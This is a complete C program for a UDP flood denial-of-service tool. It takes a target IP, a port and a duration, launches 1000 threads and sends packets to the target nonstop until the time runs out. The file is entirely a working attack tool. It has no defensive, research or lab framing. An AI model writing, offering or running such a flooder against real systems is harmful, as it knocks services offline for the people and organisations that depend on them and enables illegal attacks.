#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

#define PACKET_SIZE 1
#define NUM_THREADS 1000

typedef struct {
    int sock;
    struct sockaddr_in target_addr;
} thread_data_t;

void generate_random_data(char *data, int size) {
    for (int i = 0; i < size; i++) {
        data[i] = rand() % 256; 
    }
}

void *send_packets(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    char packet[PACKET_SIZE];
    generate_random_data(packet, PACKET_SIZE);

    while (1) {
        if (sendto(data->sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&data->target_addr, sizeof(data->target_addr)) < 0) {
            perror("Failed to send packet");
            return NULL;
        }
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target IP> <target port> <duration in seconds>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);

    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid target IP address");
        close(sock);
        return 1;
    }

    printf("Starting UDP flood to %s:%d for %d seconds with %d threads\n", target_ip, target_port, duration, NUM_THREADS);

    pthread_t threads[NUM_THREADS];
    thread_data_t thread_data;
    thread_data.sock = sock;
    thread_data.target_addr = target_addr;

    time_t start_time = time(NULL);

    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_packets, (void *)&thread_data) != 0) {
            perror("Failed to create thread");
            close(sock);
            return 1;
        }
    }

    while (time(NULL) - start_time < duration) {
        
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_cancel(threads[i]); 
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL); 
    }

    printf("UDP flood completed.\n");
    close(sock);
    return 0;
}
